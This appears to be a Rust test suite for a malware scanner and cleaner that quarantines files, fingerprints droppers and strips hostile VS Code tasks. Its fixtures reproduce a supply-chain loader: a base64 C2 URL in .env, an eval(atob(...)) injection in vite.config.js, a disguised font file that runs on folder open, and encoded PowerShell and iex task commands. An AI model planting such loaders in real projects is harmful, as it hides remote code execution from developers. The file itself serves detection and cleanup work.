#[test]
fn rule_regexes_the_rust_engine_rejects() {
    if reference().is_some() {
        return;
    }
    let tmp = Tmp::new("regex-limits");
    let mut files = vec![];
    for (name, re) in [("paren", "("), ("lookbehind", "(?<=x)evil")] {
        let r = json!({"rules": [{"id": "x", "name": "n", "condition": "$a",
                                  "strings": {"$a": {"regex": re}}}]});
        files.push(s(&write(
            &tmp.join(format!("rules-{name}.json")),
            r.to_string(),
        )));
    }
    let mut args = vec!["rules", "--validate"];
    args.extend(files.iter().map(String::as_str));
    let out = av(&tmp, &args).run();
    assert_eq!(out.code, 2);
    assert_eq!(out.stdout.matches("FAIL ").count(), 2, "{}", out.stdout);
    assert!(out.stdout.contains("look-around"), "{}", out.stdout);
}

// ------------------------------------------------------------- the vault
/// test_av_engine.py TestQuarantine / TestCLI: the default vault under
/// GUARD_HOME, contents neutered at rest, corrupt records skipped by `list`,
/// restore refusing to overwrite unless --overwrite.
#[test]
fn quarantine_vault_details() {
    let tmp = Tmp::new("vault");
    let f = write(&tmp.join("w/e.com"), eicar());
    let out = av(&tmp, &["scan", &s(&tmp.join("w")), "--quarantine"]).run();
    assert_eq!(out.code, 1, "{}", out.stderr);
    assert!(!f.exists());
    let vault = tmp.join("home/av-quarantine");
    let bins: Vec<PathBuf> = std::fs::read_dir(&vault)
        .unwrap()
        .map(|e| e.unwrap().path())
        .filter(|p| p.extension().is_some_and(|e| e == "bin"))
        .collect();
    assert_eq!(bins.len(), 1);
    let stored = std::fs::read(&bins[0]).unwrap();
    assert_ne!(stored, eicar());
    assert!(!stored.windows(5).any(|w| w == b"EICAR"), "not neutered");
    write(&vault.join("junk.json"), "{not json");
    let list = av(&tmp, &["quarantine", "list"]).run();
    assert_eq!(list.code, 0, "{}", list.stderr);
    let items = parse_json(&list.stdout);
    let items = items.as_array().unwrap();
    assert_eq!(items.len(), 1, "{}", list.stdout);
    assert!(items[0].get("key").is_none());
    let id = items[0]["id"].as_str().unwrap().to_string();
    write(&f, "something else");
    let refused = av(&tmp, &["quarantine", "restore", &id]).run();
    assert_eq!(refused.code, 2);
    assert!(refused.stderr.contains("exists"), "{}", refused.stderr);
    let forced = av(&tmp, &["quarantine", "restore", &id, "--overwrite"]).run();
    assert_eq!(forced.code, 0, "{}", forced.stderr);
    assert_eq!(std::fs::read(&f).unwrap(), eicar());
    let n = norm(&tmp).re(r"[0-9a-f]{32}", "<id>");
    golden(
        SUITE,
        "quarantine_vault_details",
        &n.apply(&format!(
            "{}=== restore\n{}=== restore --overwrite\n{}",
            out.shown(),
            refused.shown_all(),
            forced.shown_all()
        )),
    );
}

/// A vault that cannot be written is reported per file and the file stays
/// (test_quarantine_failure_reported). guard_av raised instead: binary only.
#[test]
fn quarantine_failure_is_reported() {
    if reference().is_some() {
        return;
    }
    let tmp = Tmp::new("vault-fail");
    let f = write(&tmp.join("w/e.com"), eicar());
    let blocker = write(&tmp.join("vault"), "a file, not a directory");
    let out = av(
        &tmp,
        &[
            "--vault",
            &s(&blocker),
            "scan",
            &s(&tmp.join("w")),
            "--json",
            "--quarantine",
        ],
    )
    .run();
    assert_eq!(out.code, 1, "{}", out.stderr);
    let r = get(&results(&out), "e.com");
    assert!(
        r["quarantine_error"]
            .as_str()
            .is_some_and(|e| !e.is_empty()),
        "{r}"
    );
    assert!(r.get("quarantine_id").is_none());
    assert!(f.exists());
}

/// Only regular files are scanned: a FIFO is skipped, not read
/// (test_scan_path_walks_skips_and_summarises).
#[cfg(unix)]
#[test]
fn fifo_is_not_scanned() {
    let tmp = Tmp::new("fifo");
    let d = tmp.join("t");
    write(&d.join("ok.txt"), "hello");
    write(&d.join("sub/e.com"), eicar());
    write(&d.join("sub/m.json"), sample("miner.json"));
    let fifo = std::ffi::CString::new(s(&d.join("pipe"))).unwrap();
    assert_eq!(unsafe { libc::mkfifo(fifo.as_ptr(), 0o600) }, 0);
    let out = av(&tmp, &["scan", &s(&d), "--json"]).run();
    let summary = &parse_json(&out.stdout)["summary"];
    assert_eq!(
        (
            &summary["scanned"],
            &summary["malicious"],
            &summary["suspicious"]
        ),
        (&json!(3), &json!(1), &json!(1))
    );
    golden(SUITE, "fifo_is_not_scanned", &report(&out, &norm(&tmp)));
}

// ---------------------------------------------------- guard scan / open
const B64_C2: &str = concat!("aHR0cHM6Ly9hdXRoLWNvbmZpcm0tdGVu", "LnZlcmNlbC5hcHAvYXBp");
const EVAL: &str = concat!("eval(proxy", "Info)");
const ATOB: &str = concat!("atob(process.env.", "AUTH_API_KEY)");

fn g(tmp: &Tmp, args: &[&str]) -> Guard {
    guard(args)
        .home(&tmp.join("home"))
        .env("PYTHONIOENCODING", "utf-8")
}

fn scan_norm(tmp: &Tmp) -> Norm {
    Norm::new()
        .path(&tmp.path, "TMP")
        .path(&repo_root(), "REPO")
}

/// `guard scan --json` -> (output, the "tree" results).
fn guard_scan(tmp: &Tmp, d: &Path, extra: &[&str]) -> (Out, Value) {
    let mut args = vec!["scan", d.to_str().unwrap(), "--json"];
    args.extend_from_slice(extra);
    let out = g(tmp, &args).run();
    let tree = parse_json(&out.stdout)["tree"].clone();
    (out, tree)
}

fn ids_for(tree: &Value, where_: &str) -> Vec<String> {
    let mut v: Vec<String> = tree["fingerprint"]
        .as_array()
        .unwrap()
        .iter()
        .filter(|f| f["where"].as_str().is_some_and(|w| w.ends_with(where_)))
        .map(|f| f["sig_id"].as_str().unwrap().to_string())
        .collect();
    v.sort();
    v
}

/// `guard scan --json` output with each finding list sorted: the tree walk
/// follows the file system's directory order, in both builds.
fn scan_shown(tmp: &Tmp, out: &Out) -> String {
    let mut v = parse_json(&out.stdout);
    if let Some(t) = v["tree"].as_object_mut() {
        for (_, b) in t.iter_mut() {
            if let Some(a) = b.as_array_mut() {
                a.sort_by_key(|x| x.to_string());
            }
        }
    }
    scan_norm(tmp).apply(&format!(
        "exit {}\n--- report\n{}--- stderr\n{}",
        out.code,
        canon_json(&v),
        out.stderr
    ))
}

/// `guard clean` output with its log lines and summary lists sorted (the
/// walk follows the file system's order).
fn clean_shown(n: &Norm, out: &Out) -> String {
    let start = out.stdout.find("{\n").unwrap_or(out.stdout.len());
    let mut lines: Vec<&str> = out.stdout[..start].lines().collect();
    lines.sort_unstable();
    let mut summary = parse_json(&out.stdout[start..]);
    for (_, a) in summary.as_object_mut().unwrap().iter_mut() {
        if let Some(a) = a.as_array_mut() {
            a.sort_by_key(|x| x.to_string());
        }
    }
    n.apply(&format!(
        "exit {}\n--- log\n{}\n--- summary\n{}--- stderr\n{}",
        out.code,
        lines.join("\n"),
        canon_json(&summary),
        out.stderr
    ))
}

/// The av bucket of `guard scan` (test_scanner.py
/// test_av_bucket_malicious_and_suspicious).
#[test]
fn scan_av_bucket() {
    let tmp = Tmp::new("av-bucket");
    let d = tmp.join("t");
    write(&d.join("dl/eicar.com"), eicar());
    write(&d.join("pool.json"), sample("miner.json"));
    write(
        &d.join("bundle.zip"),
        make_zip(&[("x/e.com", &eicar())], &[]),
    );
    write(&d.join("dist/skip/e.com"), eicar());
    let (out, tree) = guard_scan(&tmp, &d, &[]);
    assert_eq!(out.code, 1);
    let av: Vec<&Value> = tree["av"].as_array().unwrap().iter().collect();
    let by = |p: &str| -> &Value {
        av.iter()
            .find(|x| x["path"] == p)
            .unwrap_or_else(|| panic!("{p} not in {av:?}"))
    };
    assert_eq!(av.len(), 3, "{av:?}");
    assert_eq!(
        (
            by("dl/eicar.com")["severity"].as_str(),
            by("dl/eicar.com")["action"].as_str()
        ),
        (Some("critical"), Some("quarantine"))
    );
    assert_eq!(
        (
            by("pool.json")["severity"].as_str(),
            by("pool.json")["action"].as_str()
        ),
        (Some("medium"), Some("quarantine"))
    );
    assert_eq!(by("bundle.zip")["threat"], "EICAR-Test-File");
    assert_eq!(tree["infected"], true);
    golden(SUITE, "scan_av_bucket", &scan_shown(&tmp, &out));
}

/// test_legacy_engines.py TestFingerprintMatcher: .env-only literals,
/// pruned directories, dropper and workflow names, the structural regex and
/// its gate, the obfuscated C2 literal outside source extensions.
#[test]
fn fingerprint_scoping() {
    let tmp = Tmp::new("fingerprint");
    let d = tmp.join("r");
    let env = format!("PORT=1\nAUTH_API_KEY={B64_C2}\n");
    write(&d.join(".env"), &env);
    write(&d.join("notes.md"), &env);
    write(&d.join(".github/workflows/ci.yml"), "on: push\n");
    write(&d.join("public/fonts/fa-solid-400.woff2"), "");
    write(&d.join("a.js"), "(async () => { other(); })();\n");
    write(
        &d.join("b.js"),
        format!("(async () => {{\n const p = {ATOB};\n {EVAL};\n}})();\n"),
    );
    write(&d.join("blob.txt"), concat!("var _$_1", "e42=['x']\n"));
    write(&d.join("dist/x/eval.js"), format!("{EVAL}\n"));
    let (out, tree) = guard_scan(&tmp, &d, &[]);
    assert!(ids_for(&tree, ".env").contains(&"env.auth.b64".to_string()));
    assert!(!ids_for(&tree, "notes.md").contains(&"env.auth.b64".to_string()));
    // a binary extension goes to the magic-byte check, not the matcher
    assert_eq!(tree["magic"][0]["path"], "public/fonts/fa-solid-400.woff2");
    assert_eq!(ids_for(&tree, "ci.yml"), ["wf.name"]);
    assert!(ids_for(&tree, "a.js").is_empty());
    assert!(ids_for(&tree, "b.js").contains(&"iife.full.regex".to_string()));
    assert!(!ids_for(&tree, "blob.txt").is_empty());
    assert!(ids_for(&tree, "eval.js").is_empty());
    golden(SUITE, "fingerprint_scoping", &scan_shown(&tmp, &out));
}

/// Custom signatures: unknown regex flags are ignored, network IOCs match
/// (test_custom_flags_and_iocs).
#[test]
fn custom_flags_and_network_iocs() {
    let tmp = Tmp::new("iocs");
    let mut sig: Value =
        parse_json(&std::fs::read_to_string(repo_root().join("signatures.json")).unwrap());
    sig["regexes"]
        .as_array_mut()
        .unwrap()
        .push(json!({"id": "t.r", "severity": "high",
        "pattern": "^abc", "flags": "IGNORECASE|MULTILINE|BOGUS", "desc": "d"}));
    sig["network_iocs"]
        .as_array_mut()
        .unwrap()
        .push(json!({"id": "t.ioc", "severity": "critical",
        "value": "evil.test", "desc": "d"}));
    let sp = write(&tmp.join("sig.json"), sig.to_string());
    let d = tmp.join("r");
    write(&d.join("x.txt"), "zz\nABC evil.test");
    let (out, tree) = guard_scan(&tmp, &d, &["--signatures", &s(&sp)]);
    assert_eq!(ids_for(&tree, "x.txt"), ["t.ioc", "t.r"]);
    golden(
        SUITE,
        "custom_flags_and_network_iocs",
        &scan_shown(&tmp, &out),
    );
}

/// test_legacy_engines.py TestVSCodeGuard: unparseable but harmless files,
/// an unreadable settings.json, allowAutomaticTasks false.
#[test]
fn open_harmless_vscode_files() {
    let tmp = Tmp::new("vscode-ok");
    let r1 = tmp.join("oops");
    write(&r1.join(".vscode/settings.json"), "{oops");
    write(&r1.join(".vscode/tasks.json"), "{oops");
    let r2 = tmp.join("dir");
    std::fs::create_dir_all(r2.join(".vscode/settings.json")).unwrap();
    let r3 = tmp.join("off");
    write(
        &r3.join(".vscode/settings.json"),
        r#"{"task.allowAutomaticTasks": false}"#,
    );
    let mut all = String::new();
    for r in [r1, r2, r3] {
        let out = g(&tmp, &["open", &s(&r), "--json"]).run();
        assert_eq!(out.code, 0, "{}", out.stdout);
        assert_eq!(parse_json(&out.stdout)["safe_to_open"], true);
        all.push_str(&out.shown_all());
    }
    golden(
        SUITE,
        "open_harmless_vscode_files",
        &scan_norm(&tmp).apply(&all),
    );
}

/// A baseline file that is not JSON counts as no baseline
/// (test_without_matcher_and_bad_baseline).
#[test]
fn unreadable_workflow_baseline() {
    let tmp = Tmp::new("bad-baseline");
    let d = tmp.join("wf");
    write(&d.join(".github/workflows/build.yml"), "on: push\n");
    let repo = strip_verbatim(std::fs::canonicalize(&d).unwrap());
    let key = format!("wf-{}", &sha256(s(&repo).as_bytes())[..12]);
    let before = g(&tmp, &["scan", &s(&d), "--json"]).run();
    write(&tmp.join(format!("home/baselines/{key}.json")), "{bad json");
    let after = g(&tmp, &["scan", &s(&d), "--json"]).run();
    assert_eq!(before.stdout, after.stdout);
    let wf = &parse_json(&after.stdout)["tree"]["workflow_baseline"];
    assert_eq!(wf[0]["state"], "added", "{wf}");
    golden(
        SUITE,
        "unreadable_workflow_baseline",
        &scan_shown(&tmp, &after),
    );
}

// ------------------------------------------------------- clean / restore
const INJECTED: &str = concat!(
    "import { defineConfig } from \"vite\";\n",
    "(async () => { const proxyInfo = atob(process.env.",
    "AUTH_API_KEY); eval(proxy",
    "Info); })();\n",
    "export default defineConfig({ plugins: [] });\n"
);

/// The remediator's safe_name of a path.
fn safe(p: &Path) -> String {
    let s: String = s(p)
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || "._-".contains(c) {
                c
            } else {
                '_'
            }
        })
        .collect();
    s.trim_matches('_').to_string()
}

/// Relative path and sha256 of every file under `root`, sorted.
fn tree_listing(root: &Path) -> String {
    fn walk(base: &Path, d: &Path, out: &mut Vec<String>) {
        let Ok(rd) = std::fs::read_dir(d) else { return };
        for e in rd.flatten() {
            let p = e.path();
            if p.is_dir() {
                walk(base, &p, out);
            } else if p.is_file() {
                let rel = p
                    .strip_prefix(base)
                    .unwrap()
                    .to_string_lossy()
                    .replace('\\', "/");
                out.push(format!("{rel}  {}\n", sha256(&std::fs::read(&p).unwrap())));
            }
        }
    }
    let mut out = Vec::new();
    walk(root, root, &mut out);
    out.sort();
    out.concat()
}

fn clean_norm(tmp: &Tmp, work: &Path) -> Norm {
    Norm::new()
        .lit(&safe(work), "<SAFE-W>")
        .path(work, "W")
        .path(&tmp.path, "TMP")
        .re(r"\d{8}T\d{6}Z", "TS")
}

/// test_remediation_and_crypto.py test_clean_repo_end_to_end: each finding
/// goes its own way — the injected config is cut, droppers, av hits and a
/// webshell in source are quarantined, and a second run has nothing left to do.
#[test]
fn clean_repo_routes_findings() {
    let tmp = Tmp::new("clean-routes");
    let w = tmp.join("repo");
    write(&w.join("vite.config.js"), INJECTED);
    write(
        &w.join("public/fonts/fa-solid-400.woff2"),
        concat!("var _$_1", "e42=['x']; require('child_process')"),
    );
    write(
        &w.join(".vscode/settings.json"),
        r#"{"task.allowAutomaticTasks": true}"#,
    );
    write(
        &w.join(".vscode/tasks.json"),
        json!({"tasks": [{"command": "node", "args": [concat!("./public/fonts/", "fa-solid-400.woff2")],
                          "runOptions": {"runOn": "folderOpen"}}]})
        .to_string(),
    );
    write(&w.join("tools/eicar.com"), eicar());
    write(&w.join("web/shell.php"), sample("webshell_eval.php"));
    write(&w.join("img/logo.png"), format!("module.exports = {EVAL}"));
    let first = g(&tmp, &["clean", &s(&w)]).run();
    assert_eq!(first.code, 0, "{}", first.stderr);
    let start = first.stdout.find("{\n").expect("a JSON summary");
    let sum = parse_json(&first.stdout[start..]);
    let has = |k: &str, rel: &str| {
        sum[k]
            .as_array()
            .unwrap()
            .iter()
            .any(|p| p.as_str() == Some(&s(&rel.split('/').fold(w.clone(), |p, c| p.join(c)))))
    };
    assert!(has("neutralized", "vite.config.js"));
    for q in [
        "public/fonts/fa-solid-400.woff2",
        "tools/eicar.com",
        "img/logo.png",
        "web/shell.php",
    ] {
        assert!(has("quarantined", q), "{q}: {sum}");
    }
    assert!(
        has("config_cleaned", ".vscode/settings.json")
            && has("config_cleaned", ".vscode/tasks.json")
    );
    assert!(!w.join("web/shell.php").exists());
    let second = g(&tmp, &["clean", &s(&w)]).run();
    let start = second.stdout.find("{\n").expect("a JSON summary");
    let again = parse_json(&second.stdout[start..]);
    assert_eq!(
        (&again["quarantined"], &again["neutralized"]),
        (&json!([]), &json!([]))
    );
    let n = clean_norm(&tmp, &w);
    golden(
        SUITE,
        "clean_repo_routes_findings",
        &format!(
            "=== first\n{}--- tree\n{}=== second\n{}",
            clean_shown(&n, &first),
            tree_listing(&w),
            clean_shown(&n, &second)
        ),
    );
}

/// `guard clean <file>` edge cases of test_remediation_and_crypto.py: clean
/// source files are left alone, broken or odd VS Code files too, and every
/// task that runs on folder open or names a dropper-like command goes.
#[test]
fn clean_single_file_edge_cases() {
    let tmp = Tmp::new("clean-edges");
    let w = tmp.join("w");
    write(&w.join("a.py"), "print('x')");
    write(&w.join("b.js"), "console.log(1)");
    write(&w.join(".vscode/launch.json"), "{broken");
    write(&w.join("s1/.vscode/settings.json"), "{broken");
    write(
        &w.join("s2/.vscode/settings.json"),
        "{\"task.allowAutomaticTasks\": true, // x\n \"a\": 1}",
    );
    write(&w.join("t1/.vscode/tasks.json"), r#"{"tasks": "nope"}"#);
    write(
        &w.join("t2/.vscode/tasks.json"),
        json!({"tasks": [
            {"label": "evil", "command": "node", "args": ["./public/fonts/x.woff2"],
             "runOptions": {"runOn": "folderOpen"}},
            {"label": "ok", "command": "npm", "args": ["test"]},
            {"label": "auto-but-benign", "runOptions": {"runOn": "folderOpen"}, "command": "echo hi"},
            {"label": "ps", "runOn": "folderOpen", "command": "powershell -e AAA"},
            {"label": "no-auto", "runOptions": "x", "command": "iex "},
            "junk",
        ]})
        .to_string(),
    );
    let mut all = String::new();
    let n = clean_norm(&tmp, &w);
    for (f, twice) in [
        ("a.py", false),
        ("b.js", false),
        ("gone.js", false),
        (".vscode/launch.json", false),
        ("s1/.vscode/settings.json", false),
        ("s2/.vscode/settings.json", true),
        ("t1/.vscode/tasks.json", false),
        ("t2/.vscode/tasks.json", true),
    ] {
        for run in 0..if twice { 2 } else { 1 } {
            let out = g(&tmp, &["clean", &s(&w.join(f))]).run();
            all.push_str(&format!(
                "=== clean {f} ({run})\n{}",
                n.apply(&out.shown_all())
            ));
        }
    }
    assert!(w.join("a.py").exists() && w.join("b.js").exists());
    let tasks = parse_json(&std::fs::read_to_string(w.join("t2/.vscode/tasks.json")).unwrap());
    let labels: Vec<Value> = tasks["tasks"]
        .as_array()
        .unwrap()
        .iter()
        .map(|t| t.get("label").cloned().unwrap_or_else(|| t.clone()))
        .collect();
    assert_eq!(labels, [json!("ok"), json!("junk")]);
    all.push_str(&format!("--- tree\n{}", tree_listing(&w)));
    golden(SUITE, "clean_single_file_edge_cases", &all);
}

// ------------------------------------------------------------------ watch
/// test_integration.py: on a watcher pass a clean file is left alone, while a
/// suspicious (PUA) file and a malicious hit inside a source file are both
/// alerted on and quarantined.
#[test]
fn watch_quarantines_flagged_files() {
    let tmp = Tmp::new("watch-av");
    let w = tmp.join("w");
    write(&w.join("Downloads/notes.txt"), "hello");
    write(&w.join("Downloads/pool.json"), sample("miner.json"));
    write(&w.join("site/index.php"), sample("webshell_eval.php"));
    let home = tmp.join("home");
    write(
        &home.join("watcher.config.json"),
        json!({"notify": false, "telemetry_sec": 0, "update_check_sec": 0,
               "scan_new_files_ext": [".php", ".json", ".txt"]})
        .to_string(),
    );
    let out = guard(&["watch", "--once", "--roots", &s(&w)])
        .home(&home)
        .env("PYTHONIOENCODING", "utf-8")
        .run();
    assert_eq!(out.code, 0, "{}", out.stderr);
    let alerts: Vec<Value> = std::fs::read_to_string(home.join("alerts.jsonl"))
        .unwrap_or_default()
        .lines()
        .filter(|l| !l.trim().is_empty())
        .map(|l| {
            let mut v = parse_json(l);
            v.as_object_mut().unwrap().shift_remove("ts");
            v
        })
        .collect();
    assert_eq!(alerts.len(), 2, "{alerts:?}");
    assert!(alerts[0]["path"].as_str().unwrap().ends_with("pool.json"));
    assert!(alerts[1]["path"].as_str().unwrap().ends_with("index.php"));
    assert!(w.join("Downloads/notes.txt").exists());
    for f in ["Downloads/pool.json", "site/index.php"] {
        assert!(!w.join(f).exists(), "{f}");
    }
    let n = Norm::new()
        .path(&w, "W")
        .path(&home, "HOME")
        .path(&tmp.path, "TMP");
    golden(
        SUITE,
        "watch_quarantines_flagged_files",
        &format!(
            "--- alerts\n{}--- tree\n{}",
            n.apply(&canon_json(&Value::Array(alerts))),
            tree_listing(&w)
        ),
    );
}

/// Guard never flags its own signature databases (test_av_engine.py
/// test_engine_never_flags_its_own_databases): they are allowlisted by hash.
#[test]
fn bundled_databases_are_allowlisted() {
    let tmp = Tmp::new("own-dbs");
    let d = tmp.join("dbs");
    for f in ["av-rules.json", "av-hashes.json"] {
        let src = repo_root().join("data").join(f);
        write(&d.join(f), std::fs::read(&src).unwrap());
    }
    let out = av(&tmp, &["scan", &s(&d), "--json"]).run();
    assert_eq!(out.code, 0, "{}", out.stdout);
    assert!(results(&out).is_empty(), "{}", out.stdout);
}
